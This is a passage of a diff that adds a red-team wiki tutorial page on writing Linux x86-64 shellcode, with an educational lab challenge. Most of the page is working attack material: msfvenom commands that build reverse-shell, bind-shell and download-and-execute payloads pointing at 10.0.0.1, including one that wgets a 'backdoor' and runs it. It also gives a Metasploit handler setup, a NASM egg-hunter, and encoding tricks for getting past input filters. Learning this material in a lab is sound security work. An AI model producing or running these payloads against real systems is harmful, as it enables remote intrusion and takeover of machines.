+    print(f&#34;[*] Final payload: {len(final)} bytes&#34;)
+
+    outfile = sys.argv[1].replace(&#39;.bin&#39;, &#39;-encoded.bin&#39;)
+    with open(outfile, &#39;wb&#39;) as f:
+        f.write(final)
+    print(f&#34;[+] Written to {outfile}&#34;)
+
+if __name__ == &#34;__main__&#34;:
+    main()
+						</pre>
+					</section>
+					<section>
+						<h3 id="alphanumeric-shellcode">Alphanumeric Shellcode</h3>
+						<p>
+							Some exploits filter input to printable ASCII only (0x20-0x7e). Alphanumeric shellcode uses
+							only bytes that map to letters, digits, and certain punctuation. This exploits that many x86
+							opcodes fall in the printable range - the trick is chaining them to produce arbitrary behavior.
+						</p>
+						<p>Common alphanumeric gadgets on x86-64:</p>
+						<table>
+							<thead>
+								<tr>
+									<th align="center">Bytes</th>
+									<th align="center">Decoded Instruction</th>
+									<th align="center">Effect</th>
+								</tr>
+							</thead>
+							<tbody>
+								<tr>
+									<td align="center"><code>P</code>(0x50)</td>
+									<td align="center"><code>push rax</code></td>
+									<td align="center">Push rax onto stack</td>
+								</tr>
+								<tr>
+									<td align="center"><code>X</code>(0x58)</td>
+									<td align="center"><code>pop rax</code></td>
+									<td align="center">Pop into rax</td>
+								</tr>
+								<tr>
+									<td align="center"><code>Z</code>(0x5a)</td>
+									<td align="center"><code>pop rdx</code></td>
+									<td align="center">Pop into rdx</td>
+								</tr>
+								<tr>
+									<td align="center"><code>H</code>(0x48)</td>
+									<td align="center">REX.W prefix</td>
+									<td align="center">64-bit operand size</td>
+								</tr>
+								<tr>
+									<td align="center"><code>1</code>(0x31)</td>
+									<td align="center"><code>xor r/m, r</code></td>
+									<td align="center">XOR operation</td>
+								</tr>
+								<tr>
+									<td align="center"><code>@</code>(0x40)</td>
+									<td align="center">REX prefix</td>
+									<td align="center">Extends register encoding</td>
+								</tr>
+							</tbody>
+						</table>
+						<p>
+							Msfvenom generates alphanumeric payloads with the
+							<code>x64/xor</code>
+							encoder set to alphanumeric mode.
+							Manual construction is an academic exercise - in practice, use
+							<code>msfvenom</code>
+							:
+						</p>
+						<pre class="bash">
+# Alphanumeric (mixed) shellcode for x86-64
+msfvenom -p linux/x64/exec CMD=/bin/sh \
+    -e x64/xor \
+    ENCODERS=alphanumixed \
+    -f c
+
+# Pure alphanumeric (letters + digits only, no punctuation)
+msfvenom -p linux/x64/exec CMD=/bin/sh \
+    -e x64/xor \
+    ENCODERS=alphanum \
+    -f c
+						</pre>
+					</section>
+					<section>
+						<h3 id="msfvenom-payload-reference">Msfvenom Payload Reference</h3>
+						<pre class="bash">
+# ── Standalone Executables ── (ELF format, droppable on target)
+
+# Execute command (non-staged, self-contained)
+msfvenom -p linux/x64/exec CMD=&#34;id&#34; -f elf -o payload-exec.elf
+msfvenom -p linux/x64/exec CMD=&#34;wget http://10.0.0.1/backdoor -O /tmp/bd; chmod +x /tmp/bd; /tmp/bd&#34; -f elf -o payload-download-exec.elf
+
+# Reverse TCP shell (non-staged)
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o payload-rev.elf
+
+# Bind TCP shell (listens on target, attacker connects in)
+msfvenom -p linux/x64/shell_bind_tcp LPORT=4444 -f elf -o payload-bind.elf
+
+# ── Raw Shellcode ── (for inclusion in exploits, C arrays)
+
+# Reverse TCP shell as raw bytes
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f c
+
+# Staged reverse TCP (small stage0 downloads stage1)
+msfvenom -p linux/x64/shell/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f c
+
+# ── Encoding ──
+
+# Single iteration XOR
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
+    -e x64/xor -i 1 -f c
+
+# Multi-iteration (polymorphic XOR)
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
+    -e x64/xor -i 5 -f c
+
+# Bad character avoidance (exclude \x00, \x0a (newline), \x0d (carriage return), \x20 (space))
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
+    -b &#39;\x00\x0a\x0d\x20&#39; -f c
+
+# List all encoders
+msfvenom --list encoders
+
+# List all payloads for Linux x86-64
+msfvenom --list payloads | grep linux/x64
+						</pre>
+					</section>
+					<section>
+						<h3 id="metasploit-multi-handler">Metasploit Multi-Handler</h3>
+						<pre class="bash">
+# Start msfconsole and set up handler
+msfconsole -q -x &#34;
+    use exploit/multi/handler;
+    set PAYLOAD linux/x64/shell_reverse_tcp;
+    set LHOST 0.0.0.0;
+    set LPORT 4444;
+    set ExitOnSession false;
+    run -j
+&#34;
+
+# Or from the msfconsole prompt:
+# &gt; use exploit/multi/handler
+# &gt; set PAYLOAD linux/x64/shell_reverse_tcp
+# &gt; set LHOST 0.0.0.0
+# &gt; set LPORT 4444
+# &gt; run -j
+#
+# Once a session connects:
+# &gt; sessions -l          # list sessions
+# &gt; sessions -i 1        # interact with session 1
+# &gt; sessions -u 1        # upgrade shell session to meterpreter
+						</pre>
+					</section>
+					<section>
+						<h3 id="the-egg-hunter-pattern">The Egg-Hunter Pattern</h3>
+						<p>
+							An egg-hunter is a small piece of shellcode that searches memory for a marker (the "egg" - typically
+							a 4-byte tag repeated twice) and jumps into the payload found after it. Used when you have a
+							tiny injection point (50 bytes) and need to execute a large payload stored elsewhere in memory.
+						</p>
+						<pre class="x86asm">
+; egg-hunter.nasm — Searches memory for tag &#34;EGG!&#34; repeated twice,
+; then jumps to the payload following it.
+; x86-64 Linux, using access(2) syscall for page-boundary-safe scanning.
+
+BITS 64
+section .text
+global _start
+
+_start:
+    ; Start scanning from a reasonable address.
+    ; On Linux, the stack is typically around 0x7fff... range.
+    ; We scan upward, skipping unmapped pages via access() EFAULT detection.
+    xor rdi, rdi
+    mul rdi                    ; rax = 0, rdx = 0
+    mov r8, 0x7f0000000000     ; scan start address (adjustable)
+
+next_page:
+    ; Check if page is readable using access(2) syscall (21)
+    lea rbx, [r8 + 0x1000]     ; rbx = page boundary
+    xor rax, rax
+    mov al, 21                 ; access
+    mov rdi, r8
+    xor rsi, rsi               ; mode = F_OK
+    syscall
+
+    cmp al, 0xf2               ; EFAULT = -14 (0xf2 in unsigned)
+    je skip_page
+
+    ; Page is mapped — search for the egg
+    mov rdi, r8                ; rdi = scan pointer (scasq advances rdi)
+search_loop:
+    ; Check if we hit page boundary
+    cmp rdi, rbx
+    jae skip_page
+
+    ; Compare 8 bytes at [rdi] with the double-egg pattern
+    mov rax, 0x2147474521474745  ; &#34;EGG!EGG!&#34; in little-endian
+    scasq                       ; compare rax with [rdi], advance rdi by 8
+    jne search_loop
+
+    ; Egg found! rdi now points to 8 bytes past the egg (the payload)
+    ; Jump to payload
+    jmp rdi
+
+skip_page:
+    ; Move to next page
+    or r8, 0x0fff              ; align to page end
+    inc r8                     ; next page start
+    jmp next_page
+						</pre>
+					</section>
+					<section>
+						<h3 id="common-mistakes-when-writing-shellcode">Common Mistakes When Writing Shellcode</h3>
+						<table>
+							<thead>
+								<tr>
+									<th align="center">Mistake</th>
+									<th align="center">Symptom</th>
+									<th align="center">Solution</th>
+								</tr>
+							</thead>
+							<tbody>
+								<tr>
+									<td align="center">Null bytes in payload</td>
+									<td align="center">Shellcode truncated after first<code>\x00</code></td>
+									<td align="center">Audit with<code>xxd \| grep 00</code>. Rewrite instructions to avoid 64-bit immediates with high zero bytes.</td>
+								</tr>
+								<tr>
+									<td align="center">Using<code>.data</code>section and referencing it absolutely</td>
+									<td align="center">Segfault because<code>.data</code>is at a different address in target</td>
+									<td align="center">Put all data on the stack at runtime or use RIP-relative addressing</td>
+								</tr>
+								<tr>
+									<td align="center">Forgetting<code>cdq</code>/<code>xor rdx,rdx</code>before execve</td>
+									<td align="center">execve reads garbage as envp -> fails</td>
+									<td align="center">Always zero<code>rdx</code>before the execve syscall</td>
+								</tr>
+								<tr>
+									<td align="center"><code>push imm64</code>-> null bytes</td>
+									<td align="center"><code>push 0x0000000000000001</code>has 7 null bytes</td>
+									<td align="center">Use<code>push imm32</code>when value fits in 32 bits</td>
+								</tr>
+								<tr>
+									<td align="center">Not saving socket fd before<code>dup2</code>loop</td>
+									<td align="center"><code>rdi</code>gets clobbered</td>
+									<td align="center">Store in a callee-saved register (r12-r15)</td>
+								</tr>
+								<tr>
+									<td align="center">Wrong byte order for IP/port in<code>sockaddr_in</code></td>
+									<td align="center">connect() succeeds but goes to wrong IP/port</td>
+									<td align="center">Use network byte order (big-endian). Verify with Python's<code>socket.htons()</code>/<code>socket.inet_aton()</code></td>
+								</tr>
+								<tr>
+									<td align="center">Assuming shellcode runs in<code>.text</code></td>
+									<td align="center">W^X protection kills the process</td>
+									<td align="center">Use<code>mmap(PROT_RWX)</code>in harness; in real exploits, use<code>mprotect()</code>or ROP to call<code>mprotect</code></td>
+								</tr>
+							</tbody>
+						</table>
+					</section>
+					<section>
+						<h3 id="debugging-shellcode">Debugging Shellcode</h3>
+						<h4 id="strace-trace-syscalls">1. strace - Trace Syscalls</h4>
+						<pre class="bash">
+# Run the harness under strace to see each syscall
+strace -e trace=execve,socket,connect,dup2,write,mmap,mprotect ./harness 2&gt;&amp;1
+
+# Show register state at each syscall
+strace -e trace=execve -v ./harness
+						</pre>
+						<h4 id="gdb-with-int3-breakpoint">2. GDB with <code>int3</code> Breakpoint</h4>
+						<p>
+							Insert
+							<code>int3</code>
+							(opcode
+							<code>0xCC</code>
+							) as the first byte of shellcode to break immediately:
+						</p>
+						<pre class="bash">
+# Replace first byte of payload with 0xCC
+python3 -c &#34;
+import sys
+data = open(&#39;execve.bin&#39;,&#39;rb&#39;).read()
+open(&#39;execve-bp.bin&#39;,&#39;wb&#39;).write(b&#39;\xCC&#39; + data[1:])
+&#34;
+
+# Update harness to use execve-bp.bin, then:
+gdb ./harness
+(gdb) run
+# Breaks at first instruction. Now single-step:
+(gdb) display/10i $rip
+(gdb) si               # step instruction
+(gdb) info registers   # inspect all registers
+(gdb) x/s $rdi         # examine string at rdi pointer
+						</pre>
+					</section>
+					<section>
+						<h3 id="architecture-differences">Architecture Differences</h3>
+						<table>
+							<thead>
+								<tr>
+									<th align="center">Property</th>
+									<th align="center">x86-64</th>
+									<th align="center">x86-32</th>
+									<th align="center">AArch64 (ARM64)</th>
+								</tr>
+							</thead>
+							<tbody>
+								<tr>
+									<td align="center">Syscall instruction</td>
+									<td align="center"><code>syscall</code></td>
+									<td align="center"><code>int 0x80</code></td>
+									<td align="center"><code>svc #0</code></td>
+								</tr>
+								<tr>
+									<td align="center">Syscall number register</td>
+									<td align="center"><code>rax</code></td>
+									<td align="center"><code>eax</code></td>
+									<td align="center"><code>x8</code></td>
+								</tr>
+								<tr>
+									<td align="center">Arg 1 register</td>
+									<td align="center"><code>rdi</code></td>
+									<td align="center"><code>ebx</code></td>
+									<td align="center"><code>x0</code></td>
+								</tr>
+								<tr>
+									<td align="center">Arg 2 register</td>
+									<td align="center"><code>rsi</code></td>
+									<td align="center"><code>ecx</code></td>
+									<td align="center"><code>x1</code></td>
+								</tr>
+								<tr>
+									<td align="center">Arg 3 register</td>
+									<td align="center"><code>rdx</code></td>
+									<td align="center"><code>edx</code></td>
+									<td align="center"><code>x2</code></td>
+								</tr>
+								<tr>
+									<td align="center">execve syscall number</td>
+									<td align="center">59</td>
+									<td align="center">11</td>
+									<td align="center">221</td>
+								</tr>
+								<tr>
+									<td align="center">Return value register</td>
+									<td align="center"><code>rax</code></td>
+									<td align="center"><code>eax</code></td>
+									<td align="center"><code>x0</code></td>
+								</tr>
+								<tr>
+									<td align="center">Null-free zeroing</td>
+									<td align="center"><code>xor rdi, rdi</code>(3 bytes)</td>
+									<td align="center"><code>xor ebx, ebx</code>(2 bytes)</td>
+									<td align="center"><code>mov x0, xzr</code>(4 bytes, contains \x00)</td>
+								</tr>
+								<tr>
+									<td align="center">Stack pointer</td>
+									<td align="center"><code>rsp</code></td>
+									<td align="center"><code>esp</code></td>
+									<td align="center"><code>sp</code></td>
+								</tr>
+							</tbody>
+						</table>
+						<p>
+							ARM64 null-byte challenge:
+							<code>mov x0, xzr</code>
+							encodes as
+							<code>0xaa1f03e0</code>
+							- no null bytes.
+							<code>mov x0, #59</code>
+							encodes as
+							<code>0xd2800760</code>
+							- also null-free. But string references require
+							<code>adr</code>
+							instruction with
+							page-relative offset, which may embed null bytes depending on alignment.
+						</p>
+					</section>
+					<section>
+						<h3 id="verification-checklist">Verification Checklist</h3>
+						<p>After writing shellcode, verify each property:</p>
+						<pre class="bash">
+#!/bin/bash
+# verify-shellcode.sh — Automated shellcode quality checks
+SHELLCODE_BIN=&#34;$1&#34;
+
+echo &#34;[*] Analyzing: $SHELLCODE_BIN&#34;
+
+# 1. Size
+SIZE=$(stat --format=%s &#34;$SHELLCODE_BIN&#34;)
+echo &#34;    Size: $SIZE bytes&#34;
+
+# 2. Null byte count
+NULLS=$(xxd -p &#34;$SHELLCODE_BIN&#34; | tr -d &#39;\n&#39; | fold -w2 | grep -c &#39;00&#39;)
+if [ &#34;$NULLS&#34; -gt 0 ]; then
+    echo &#34;    [!] $NULLS null bytes found&#34;
+    echo &#34;    Null byte offsets:&#34;
+    xxd &#34;$SHELLCODE_BIN&#34; | grep &#39; 00&#39;
+else
+    echo &#34;    [+] No null bytes&#34;
+fi
+
+# 3. Test execution (if it&#39;s an ELF)
+if [ -x &#34;$SHELLCODE_BIN&#34; ]; then
+    echo &#34;[*] Running shellcode...&#34;
+    timeout 3 &#34;$SHELLCODE_BIN&#34; &lt; /dev/null 2&gt;&amp;1 &amp;
+    PID=$!
+    sleep 1
+    if kill -0 $PID 2&gt;/dev/null; then
+        echo &#34;    [+] Shellcode is running (PID $PID)&#34;
+        kill $PID 2&gt;/dev/null
+    else
+        echo &#34;    [-] Shellcode exited immediately (expected for execve)&#34;
+    fi
+fi
+						</pre>
+					</section>
+					<section>
+						<h3 id="summary-table-shellcode-types">Summary Table - Shellcode Types</h3>
+						<table>
+							<thead>
+								<tr>
+									<th align="center">Type</th>
+									<th align="center">Connect Direction</th>
+									<th align="center">Use Case</th>
+									<th align="center">Complexity</th>
+								</tr>
+							</thead>
+							<tbody>
+								<tr>
+									<td align="center"><b>execve shell</b></td>
+									<td align="center">None (local)</td>
+									<td align="center">Popping a local shell after buffer overflow</td>
+									<td align="center">Minimal (25-35 bytes)</td>
+								</tr>
+								<tr>
+									<td align="center"><b>Reverse TCP</b></td>
+									<td align="center">Target -> Attacker</td>
+									<td align="center">Getting remote access through NAT/firewall</td>
+									<td align="center">Medium (90-120 bytes)</td>
+								</tr>
+								<tr>
+									<td align="center"><b>Bind TCP</b></td>
+									<td align="center">Attacker -> Target</td>
+									<td align="center">When target has routable IP, no outbound filtering</td>
+									<td align="center">Medium (80-110 bytes)</td>
+								</tr>
+								<tr>
+									<td align="center"><b>Reverse HTTP(S)</b></td>
+									<td align="center">Target -> Attacker</td>
+									<td align="center">Blending with web traffic, egress filtering bypass</td>
+									<td align="center">High (250+ bytes)</td>
+								</tr>
+								<tr>
+									<td align="center"><b>Staged</b></td>
+									<td align="center">Depends on stage2</td>
+									<td align="center">Small initial payload downloads a larger stage2</td>
+									<td align="center">Minimal (50-80 bytes for stage0)</td>
+								</tr>
+								<tr>
+									<td align="center"><b>Egg-hunter</b></td>
+									<td align="center">N/A</td>
+									<td align="center">Finding a larger payload already in memory</td>
+									<td align="center">Minimal (30-50 bytes)</td>
+								</tr>
+								<tr>
+									<td align="center"><b>Alphanumeric</b></td>
+									<td align="center">Depends on payload</td>
+									<td align="center">Bypassing input filters that reject non-printable bytes</td>
+									<td align="center">High (encoding overhead)</td>
+								</tr>
+							</tbody>
+						</table>
+					</section>
+					<section>
+						<h3 id="challenge">Challenge</h3>
+						<p>
+							Write null-free shellcode, extract it, and run it inside the lab container. The container ships
+							nasm, gcc, gdb, strace, and Python so you can assemble a payload, verify that it contains no
+							null bytes, and trace the syscalls it makes.
+						</p>
+						<p><a href="/wiki/articles/redteam/shellcode.Containerfile">shellcode.Containerfile</a></p>
+						<pre class="bash">
+podman build -t shellcode -f shellcode.Containerfile .
+podman run -it --rm shellcode
+
+# Inside the container, write execve.nasm, then:
+nasm -f elf64 execve.nasm -o execve.o
+ld -s execve.o -o execve
+objcopy -O binary execve execve.bin
+xxd -i execve.bin
+
+# Confirm there are no null bytes:
+xxd -p execve.bin | tr -d &#39;\n&#39; | grep -o &#39;00&#39; | wc -l
+
+# Test the reverse shell with a listener on the host:
+# host:      nc -lvnp 4444
+# container: ./harness-reverse   (LHOST = 172.17.0.1, LPORT = 4444)
+						</pre>
+					</section>
+					<section>
+						<h3 id="references">References</h3>
+						<ul>
+							<li><a class="icon-website" href="https://man7.org/linux/man-pages/man2/execve.2.html" target="_blank">execve(2) - Linux man page</a></li>
+							<li><a class="icon-website" href="https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/" target="_blank">Linux x86-64 System Call Table</a></li>
+							<li><a class="icon-website" href="https://www.nasm.us/doc/" target="_blank">NASM - The Netwide Assembler</a></li>
+							<li><a class="icon-website" href="https://www.intel.com/content/www/us/en/developer/articles/technical/intel-sdm.html" target="_blank">Intel 64 and IA-32 Architectures Software Developer's Manual</a></li>
+							<li><a class="icon-website" href="http://phrack.org/issues/49/14.html" target="_blank">Phrack 49 - Smashing The Stack For Fun And Profit</a></li>
+							<li><a class="icon-website" href="https://docs.metasploit.com/docs/using/metasploit/using-msfvenom.html" target="_blank">msfvenom - Metasploit Documentation</a></li>
+						</ul>
+					</section>
+				</article>
+			</main>
+		</div>
+
+		<footer>
+			<div></div>
+			<div class="print-not">Made with 💔 in Germany. &copy; Cookie Engineer (https://cookie.engineer). All rights (and jokes) reserved under European Law.</div>
+			<div></div>
+		</footer>
+
+	</body>
+</html>
